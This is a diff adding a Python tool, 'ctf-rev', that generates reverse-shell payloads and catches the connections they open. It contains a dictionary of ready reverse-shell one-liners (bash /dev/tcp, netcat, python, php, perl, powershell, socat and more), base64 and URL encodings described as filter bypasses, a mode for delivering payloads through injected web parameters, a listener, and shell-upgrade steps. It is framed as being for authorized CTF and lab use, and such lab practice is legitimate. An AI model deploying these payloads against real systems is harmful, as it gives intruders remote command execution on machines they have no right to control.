@@ -1,0 +1,291 @@
+#!/usr/bin/env python3
+"""ctf-rev — reverse-shell payload generator + listener (a local revshells.com).
+
+Two halves, one command:
+
+  gen     build a reverse-shell one-liner for LHOST:LPORT (LHOST auto-detected from tun0)
+  listen  catch the callback — prefers pwncat-cs, then nc/ncat, then a pure-Python socket
+  ip      just print the detected LHOST (handy for pasting elsewhere)
+
+Examples:
+    ctf-rev gen bash 4444                 # bash /dev/tcp one-liner, LHOST from tun0
+    ctf-rev gen python3 10.10.14.3 9001   # explicit LHOST
+    ctf-rev gen -a 4444                   # dump EVERY payload variant for copy-paste
+    ctf-rev gen -l                        # list the shell types
+    ctf-rev gen bash 4444 --enc b64       # base64-wrapped (filter bypass); also: url
+    ctf-rev gen --for-web 4444            # injection-safe payload, URL-encoded (see below)
+    ctf-rev listen 4444                   # catch it (pwncat > nc > python) + TTY cheatsheet
+
+Delivering through a URL / injected command (GET param, ?cmd=, SSTI, etc.):
+    Do NOT paste `bash -i >& /dev/tcp/...` into a web param. It needs bash (`/dev/tcp`,
+    `>&`) but injected commands usually run under /bin/sh (dash) and the spaces/`&`/`#`
+    get mangled by the URL. Use `--for-web`: it picks the nc-mkfifo payload (pure POSIX
+    sh, no /dev/tcp) and URL-encodes it (spaces→%20, etc.) so it survives the request.
+
+Stdlib-only. Intended for authorized CTF / lab exploitation — the auto-LHOST reads tun0,
+the encodings are the standard revshells.com input-filter bypasses.
+"""
+import os, sys, socket, shutil, subprocess, threading, urllib.parse, base64
+
+TTY = sys.stdout.isatty()
+
+
+def c(code, s):
+    return f"\033[{code}m{s}\033[0m" if TTY else s
+
+
+def eprint(*a):
+    print(*a, file=sys.stderr)
+
+
+# ── LHOST detection ──────────────────────────────────────────────────────────
+def detect_lhost(iface=None):
+    """Best-effort local IP. Order: tun0 (or -i IFACE) → UDP-socket trick → hostname."""
+    order = [iface] if iface else ["tun0", "tun1", "wg0", "eth0", "eth1"]
+    for ifc in order:
+        if not ifc:
+            continue
+        try:
+            out = subprocess.run(["ip", "-4", "-o", "addr", "show", ifc],
+                                 capture_output=True, text=True, timeout=4).stdout
+            # e.g. "5: tun0    inet 10.10.14.3/23 ..."
+            for tok in out.split():
+                if "/" in tok and tok.split("/")[0].count(".") == 3:
+                    return tok.split("/")[0]
+        except Exception:
+            pass
+    # UDP trick — no packet actually sent; just picks the outbound-route source IP.
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        pass
+    try:
+        return socket.gethostbyname(socket.gethostname())
+    except Exception:
+        return "127.0.0.1"
+
+
+# ── Payload templates ────────────────────────────────────────────────────────
+# {ip} / {port} are substituted. Ordered roughly by how often they land.
+PAYLOADS = {
+    "bash":        'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
+    "bash-read":   '0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196',
+    "bash-udp":    'sh -i >& /dev/udp/{ip}/{port} 0>&1',
+    "sh":          'sh -i >& /dev/tcp/{ip}/{port} 0>&1',
+    "nc-mkfifo":   'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f',
+    "nc-e":        'nc -e /bin/sh {ip} {port}',
+    "nc.traditional": 'nc.traditional -e /bin/sh {ip} {port}',
+    "ncat":        'ncat {ip} {port} -e /bin/bash',
+    "ncat-ssl":    'ncat --ssl {ip} {port} -e /bin/bash',
+    "python3":     'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")\'',
+    "php":         'php -r \'$s=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
+    "perl":        'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}\'',
+    "ruby":        'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
+    "socat":       'socat TCP:{ip}:{port} EXEC:/bin/sh',
+    "socat-tty":   'socat TCP:{ip}:{port} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane',
+    "powershell":  'powershell -nop -W hidden -c "$c=New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\'PS \'+(pwd).Path+\'> \';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}}"',
+    "awk":         'awk \'BEGIN{{s="/inet/tcp/0/{ip}/{port}";while(1){{do{{printf "> "|&s;s|&getline c;if(c){{while((c|&getline)>0)print $0|&s;close(c)}}}}while(c!="exit")}}}}\' /dev/null',
+    "node":        'node -e \'sh=require("child_process").spawn("/bin/sh");net=require("net");c=new net.Socket();c.connect({port},"{ip}",function(){{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);}});\'',
+    "lua":         'lua -e \'local s=require("socket");local t=assert(s.tcp());t:connect("{ip}",{port});while true do local r=t:receive();local f=io.popen(r,"r");local o=f:read("*a");f:close();t:send(o);end\'',
+}
+
+# Shells whose payload is a bash-runnable one-liner (safe to base64-wrap for filter bypass).
+_BASHY = {"bash", "bash-read", "bash-udp", "sh", "nc-mkfifo", "nc-e", "ncat", "socat", "socat-tty"}
+
+
+def build(shell, ip, port):
+    if shell not in PAYLOADS:
+        eprint(c("31", f"[ctf-rev] unknown shell {shell!r}. Try: ctf-rev gen -l"))
+        sys.exit(2)
+    return PAYLOADS[shell].format(ip=ip, port=port)
+
+
+def encode(payload, enc, shell):
+    if enc in (None, "raw"):
+        return payload
+    if enc == "url":
+        return urllib.parse.quote(payload)
+    if enc == "b64":
+        b = base64.b64encode(payload.encode()).decode()
+        if shell in _BASHY:
+            return f"echo {b}|base64 -d|bash"
+        return b   # non-bash: just the base64 blob, decode however the target allows
+    eprint(c("31", f"[ctf-rev] unknown --enc {enc!r} (raw|url|b64)"))
+    sys.exit(2)
+
+
+# ── Listener ─────────────────────────────────────────────────────────────────
+TTY_CHEATSHEET = """\
+  ── upgrade a dumb shell to a full TTY ────────────────────────────────
+    python3 -c 'import pty;pty.spawn("/bin/bash")'     # then, in THIS terminal:
+    Ctrl-Z
+    stty raw -echo; fg                                 # (type `fg` blind, Enter)
+    export TERM=xterm; stty rows 50 columns 200        # match your window
+  ──────────────────────────────────────────────────────────────────────"""
+
+
+def py_listener(port):
+    """Pure-stdlib fallback catcher: bridges local stdin <-> the connected socket."""
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind(("0.0.0.0", port))
+    srv.listen(1)
+    eprint(c("36", f"[ctf-rev] python listener on 0.0.0.0:{port} — waiting for a callback ..."))
+    conn, addr = srv.accept()
+    eprint(c("32", f"[ctf-rev] connection from {addr[0]}:{addr[1]}"))
+    eprint(c("2", TTY_CHEATSHEET))
+    stop = threading.Event()
+
+    def recv():
+        while not stop.is_set():
+            try:
+                data = conn.recv(4096)
+            except OSError:
+                break
+            if not data:
+                break
+            sys.stdout.write(data.decode(errors="replace"))
+            sys.stdout.flush()
+        stop.set()
+
+    threading.Thread(target=recv, daemon=True).start()
+    try:
+        for line in sys.stdin:
+            if stop.is_set():
+                break
+            conn.sendall(line.encode())
+    except KeyboardInterrupt:
+        pass
+    finally:
+        stop.set()
+        conn.close()
+        srv.close()
+        eprint(c("2", "\n[ctf-rev] listener closed"))
+
+
+def listen(port, want_tty=False):
+    lhost = detect_lhost()
+    eprint(c("1;36", f"[ctf-rev] catching on {lhost}:{port}  (also 0.0.0.0:{port})"))
+    if shutil.which("pwncat-cs"):
+        eprint(c("32", "[ctf-rev] using pwncat-cs — auto TTY, history, up/download (help: type `?`)"))
+        return subprocess.call(["pwncat-cs", "-lp", str(port)])
+    # No pwncat → the catcher will be a DUMB shell: no prompt, no tab-complete, Ctrl-C kills
+    # the whole session. Point the user at the fix (pwncat) and the manual upgrade below.
+    eprint(c("33", "[ctf-rev] pwncat-cs not found → catcher will be a dumb shell (no prompt, no"
+                   " tab-completion). Install it for auto-TTY:  pipx install pwncat-cs"))
+    eprint(c("2", TTY_CHEATSHEET))
+    nc = shutil.which("ncat") or shutil.which("nc")
+    if nc:
+        base = [nc, "-lvnp", str(port)]         # nc.traditional and ncat both accept -lvnp PORT
+        if shutil.which("rlwrap"):
+            base = ["rlwrap"] + base            # line editing + history in the catcher
+        eprint(c("32", f"[ctf-rev] using {os.path.basename(nc)}: {' '.join(base)}"))
+        eprint(c("2", "[ctf-rev] once connected, run the pty.spawn line above to get a real prompt."))
+        return subprocess.call(base)
+    eprint(c("33", "[ctf-rev] nc/ncat not found — falling back to the built-in python listener"))
+    py_listener(port)
+    return 0
+
+
+# ── arg handling ─────────────────────────────────────────────────────────────
+def _split_hostport(rest):
+    """rest is the positionals after the shell name: [PORT] or [LHOST, PORT]."""
+    if len(rest) == 1:
+        return None, rest[0]
+    if len(rest) >= 2:
+        return rest[0], rest[1]
+    return None, None
+
+
+def cmd_gen(argv):
+    iface = None
+    enc = None
+    dump_all = False
+    for_web = False
+    pos = []
+    it = iter(argv)
+    for a in it:
+        if a == "-l":
+            for k, v in PAYLOADS.items():
+                print(f"  {c('36', k):<24} {v}")
+            return
+        elif a == "-a":
+            dump_all = True
+        elif a in ("--for-web", "--url"):
+            for_web = True
+        elif a in ("-i", "--iface"):
+            iface = next(it, None)
+        elif a == "--enc":
+            enc = next(it, None)
+        elif a.startswith("-"):
+            eprint(c("31", f"[ctf-rev] unknown flag {a!r}")); sys.exit(2)
+        else:
+            pos.append(a)
+
+    if dump_all:
+        lhost, port = _split_hostport(pos)
+    else:
+        if not pos:
+            eprint("usage: ctf-rev gen [SHELL] [LHOST] LPORT   (SHELL default: bash; -a for all)")
+            sys.exit(2)
+        # --for-web forces an injection-safe POSIX payload + URL encoding, so a bare
+        # SHELL arg is optional; default to nc-mkfifo (no /dev/tcp, runs under dash).
+        default_shell = "nc-mkfifo" if for_web else "bash"
+        shell = pos[0] if pos[0] in PAYLOADS else default_shell
+        rest = pos[1:] if pos[0] in PAYLOADS else pos
+        lhost, port = _split_hostport(rest)
+        if for_web and enc in (None, "raw"):
+            enc = "url"
+
+    if not port or not str(port).isdigit():
+        eprint(c("31", "[ctf-rev] need a numeric LPORT (e.g. ctf-rev gen bash 4444)")); sys.exit(2)
+    ip = lhost or detect_lhost(iface)
+    if not lhost:
+        eprint(c("2", f"[ctf-rev] LHOST auto-detected: {ip}   (override: ctf-rev gen SHELL {ip} {port})"))
+
+    if dump_all:
+        print(c("1;36", f"# reverse shells for {ip}:{port}\n"))
+        for k, v in PAYLOADS.items():
+            print(c("33", f"# {k}"))
+            print(v.format(ip=ip, port=port) + "\n")
+        return
+
+    raw = build(shell, ip, port)
+    payload = encode(raw, enc, shell)
+    if for_web:
+        eprint(c("2", f"[ctf-rev] web-delivery payload: {shell} + URL-encoded (paste into the vulnerable param)"))
+        eprint(c("2", f"[ctf-rev] decoded: {raw}"))
+        eprint(c("2", f"[ctf-rev] start your catcher first:  ctf-rev listen {port}"))
+    print(payload)
+
+
+def main():
+    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help"):
+        print(__doc__)
+        return
+    sub, rest = sys.argv[1], sys.argv[2:]
+    if sub == "gen":
+        cmd_gen(rest)
+    elif sub == "listen":
+        want_tty = "--tty" in rest
+        rest = [r for r in rest if r != "--tty"]
+        if not rest or not rest[0].isdigit():
+            eprint("usage: ctf-rev listen LPORT [--tty]"); sys.exit(2)
+        listen(int(rest[0]), want_tty)
+    elif sub == "ip":
+        iface = rest[1] if len(rest) >= 2 and rest[0] in ("-i", "--iface") else None
+        print(detect_lhost(iface))
+    else:
+        eprint(c("31", f"[ctf-rev] unknown subcommand {sub!r} (gen | listen | ip)")); sys.exit(2)
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        eprint("\n[ctf-rev] interrupted")
+        sys.exit(130)
